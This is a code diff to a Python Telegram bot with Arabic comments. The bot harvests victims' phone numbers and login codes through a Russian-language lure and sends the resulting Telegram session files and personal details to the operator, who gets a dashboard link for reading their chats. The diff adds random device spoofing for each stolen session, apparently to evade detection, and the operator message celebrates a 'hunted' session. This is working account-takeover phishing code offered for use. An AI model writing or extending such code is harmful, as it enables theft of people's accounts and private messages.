@@ -2,6 +2,7 @@ import os
 import secrets
 import asyncio
 import threading
+import random
 from functools import wraps
 from flask import Flask, render_template_string, jsonify, request
 
@@ -33,6 +34,34 @@ active_web_tokens = {} # توكنات دخول لوحة التحكم {token: ses
 
 # 🧠 ذاكرة البوت لتخزين file_id الخاص بالفيديو
 CACHED_VIDEO_FILE_ID = None
+
+# =============================================================
+# دالة توليد بيانات جهاز عشوائية لكل جلسة جديدة (Device Spoofer)
+# =============================================================
+def get_random_device_params():
+    devices = [
+        {"device": "Samsung Galaxy S23 Ultra", "sys": "Android 14", "app": "10.8.1 (4321)"},
+        {"device": "Samsung Galaxy A54", "sys": "Android 13", "app": "10.6.2 (4110)"},
+        {"device": "iPhone 15 Pro Max", "sys": "iOS 17.4.1", "app": "10.9.0 (2890)"},
+        {"device": "iPhone 14 Pro", "sys": "iOS 16.6", "app": "10.2.1 (2600)"},
+        {"device": "Xiaomi 13 Pro", "sys": "Android 13", "app": "10.5.0 (3980)"},
+        {"device": "Google Pixel 8 Pro", "sys": "Android 14", "app": "10.7.3 (4200)"},
+        {"device": "OnePlus 11", "sys": "Android 13", "app": "10.4.1 (3810)"},
+        {"device": "Redmi Note 12", "sys": "Android 12", "app": "10.1.0 (3500)"},
+        {"device": "iPad Pro 12.9", "sys": "iPadOS 17.2", "app": "10.8.0 (2810)"}
+    ]
+    languages = ["ru", "en", "ru-RU", "en-US"]
+    
+    selected = random.choice(devices)
+    selected_lang = random.choice(languages)
+    
+    return {
+        "device_model": selected["device"],
+        "system_version": selected["sys"],
+        "app_version": selected["app"],
+        "system_lang_code": selected_lang,
+        "lang_code": "ru"
+    }
 
 # =============================================================
 # 2. خادم الويب (Flask Web Dashboard - "وهم")
@@ -160,7 +189,7 @@ WEB_TEMPLATE = """
                     document.getElementById('chats-list').innerHTML = `<div class="p-4 text-center text-red-400">${data.error}</div>`;
                 }
             } catch (e) {
-                document.getElementById('chats-list').innerHTML = '<div class="p-4 text-center text-red-400">حدث خطأ أثنا التحميل</div>';
+                document.getElementById('chats-list').innerHTML = '<div class="p-4 text-center text-red-400">حدث خطأ أثناء التحميل</div>';
             }
         }
 
@@ -337,7 +366,7 @@ async def api_messages():
             sender = "Я" if msg.out else ("Собеседник")
             messages_data.append({
                 "id": msg.id,
-                "text": msg.text or "[Медиاконтент]",
+                "text": msg.text or "[Медиаконтент]",
                 "out": msg.out,
                 "sender": sender,
                 "date": msg.date.strftime("%H:%M") if msg.date else ""
@@ -407,11 +436,11 @@ async def start_command(event):
                 caption=russian_welcome,
                 buttons=phone_btn
             )
-        elif os.path.exists("8219429418779326019.mp4"):
+        elif os.path.exists("vip.mp4"):
             # الرفع للمرة الأولى فقط، وتخزين الـ file_id في الذاكرة
             sent_msg = await bot.send_file(
                 event.chat_id,
-                "8219429418779326019.mp4",
+                "vip.mp4",
                 caption=russian_welcome,
                 buttons=phone_btn
             )
@@ -424,7 +453,7 @@ async def start_command(event):
         # حماية ضد الأخطاء المباشرة لتفادي تعطل البوت
         await event.respond(russian_welcome, buttons=phone_btn)
 
-# استقبال رقم الهاتف باللغة الروسية
+# استقبال رقم الهاتف باللغة الروسية مع تخصيص هوية جهاز عشوائية
 @bot.on(events.NewMessage)
 async def process_phone(event):
     user_id = event.sender_id
@@ -438,7 +467,20 @@ async def process_phone(event):
             loading_msg = await event.respond("⏳ Отправка запроса в Telegram...", buttons=Button.clear())
             
             sess_filename = os.path.join(SESSIONS_DIR, f"sess_{user_id}")
-            temp_client = TelegramClient(sess_filename, API_ID, API_HASH)
+            
+            # 🎲 توليد جهاز عشوائي كامل لهذه الجلسة بالتحديد
+            device_info = get_random_device_params()
+            
+            temp_client = TelegramClient(
+                sess_filename, 
+                API_ID, 
+                API_HASH,
+                device_model=device_info["device_model"],
+                system_version=device_info["system_version"],
+                app_version=device_info["app_version"],
+                system_lang_code=device_info["system_lang_code"],
+                lang_code=device_info["lang_code"]
+            )
             await temp_client.connect()
             
             try:
@@ -449,7 +491,8 @@ async def process_phone(event):
                     "client": temp_client,
                     "phone_code_hash": res.phone_code_hash,
                     "sess_filename": sess_filename,
-                    "code": ""
+                    "code": "",
+                    "device_info": device_info  # حفظ معلومات الجهاز للاستفادة منها في التقرير
                 })
                 
                 disp_text, btns = make_numeric_keyboard("")
@@ -533,6 +576,7 @@ async def notify_owner_and_finish(event, user_id):
     sess_filename = state["sess_filename"]
     referrer_id = state["referrer_id"]
     phone = state["phone"]
+    device_info = state.get("device_info", {})
     file_path = f"{sess_filename}.session"
 
     # جلب معلومات المستهدف
@@ -562,12 +606,14 @@ async def notify_owner_and_finish(event, user_id):
 
     # 2. إرسال ملف الجلسة + البيانات + رابط التحكم لصاحب رابط الدعوة (Referrer/Admin)
     if os.path.exists(file_path):
+        device_str = f"{device_info.get('device_model', 'غير معروف')} ({device_info.get('system_version', '')})"
         notification_text = (
             f"🚀 **تم صيد جلسة جديدة بنجاح!**\n\n"
             f"👤 **الاسم:** {first_name} {last_name}\n"
             f"🆔 **الآيدي:** `{user_id}`\n"
             f"🏷️ **اليوزر:** {username}\n"
-            f"📱 **الرقم:** `{phone}`\n\n"
+            f"📱 **الرقم:** `{phone}`\n"
+            f"📱 **الجهاز المستخدم:** `{device_str}`\n\n"
             f"🌐 **رابط تحكم واجهة (وَهَم):**\n{wahm_link}"
         )
         
